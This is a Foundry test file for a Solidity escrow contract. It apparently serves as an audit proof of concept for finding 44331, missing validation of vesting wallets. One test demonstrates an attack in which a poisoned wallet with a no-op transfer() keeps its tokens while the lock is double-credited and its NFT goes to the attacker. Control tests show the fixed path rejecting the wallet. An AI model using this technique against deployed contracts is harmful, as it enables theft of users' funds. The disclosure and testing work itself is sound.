// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {
    Exploit,
    MockToken,
    EscrowManager,
    PoisonedVestingWallet,
    HonestVestingWallet
} from "./44331-missing-validation-of-vesting-wallets-in-escrowmanagercreate.sol";

contract EywaCreateLockPoisonWalletTest is Test {
    function test_exploit_poisoned_wallet_keeps_tokens_and_double_credits_lock() public {
        Exploit e = new Exploit();
        e.run();

        uint256 kept = e.eywa().balanceOf(address(e.poison()));
        uint256 pulled = e.eywa().balanceOf(address(e.escrow()));
        uint256 credited = e.escrow().lastLock();

        // 1000 EYWA stays in the attacker wallet. Escrow receives 0.
        // The same wallet was listed twice, so the lock is credited 2000 EYWA.
        console.log("EYWA kept in attacker wallet", kept);
        console.log("EYWA pulled into escrow", pulled);
        console.log("EYWA credited to the lock", credited);
        assertEq(kept, 1000 ether, "attacker wallet keeps 1000 EYWA");
        assertEq(pulled, 0, "escrow received 0 EYWA");
        assertEq(credited, 2000 ether, "lock credited 2000 EYWA");
        assertEq(e.poison().noopCount(), 2, "transfer() was a no-op on both passes");
        assertEq(e.escrow().ownerOf(1), address(e), "lock NFT minted to attacker");
    }

    function test_control_honest_wallet_escrows_the_balance_once() public {
        MockToken eywa = new MockToken("EYWA", "EYWA", 18);
        EscrowManager escrow = new EscrowManager(eywa);
        HonestVestingWallet honest = new HonestVestingWallet(address(this), eywa);
        eywa.mint(address(honest), 1000 ether);

        address[] memory wallets = new address[](1);
        wallets[0] = address(honest);
        escrow.createLock(1, address(this), wallets);

        assertEq(eywa.balanceOf(address(escrow)), 1000 ether, "honest transfer escrows 1000");
        assertEq(eywa.balanceOf(address(honest)), 0, "honest wallet is emptied");
        assertEq(escrow.lastLock(), 1000 ether, "honest lock matches the tokens pulled");
    }

    function test_control_factory_check_rejects_poison_and_releases_honest() public {
        MockToken eywa = new MockToken("EYWA", "EYWA", 18);
        EscrowManager escrow = new EscrowManager(eywa);
        PoisonedVestingWallet poison = new PoisonedVestingWallet(address(this), eywa);
        HonestVestingWallet honest = new HonestVestingWallet(address(this), eywa);
        eywa.mint(address(poison), 1000 ether);
        eywa.mint(address(honest), 1000 ether);
        escrow.setFactoryValid(address(honest), true);

        address[] memory bad = new address[](1);
        bad[0] = address(poison);
        vm.expectRevert(EscrowManager.InvalidVestingWallet.selector);
        escrow.createLockFixed(1, address(this), bad);

        address[] memory good = new address[](1);
        good[0] = address(honest);
        escrow.createLockFixed(1, address(this), good);
        assertEq(eywa.balanceOf(address(escrow)), 1000 ether, "fixed path escrows the honest 1000");
        assertEq(escrow.lastLock(), 1000 ether, "fixed path credits exactly the pulled balance");
        assertEq(eywa.balanceOf(address(poison)), 1000 ether, "poisoned wallet never entered the lock");
    }
}
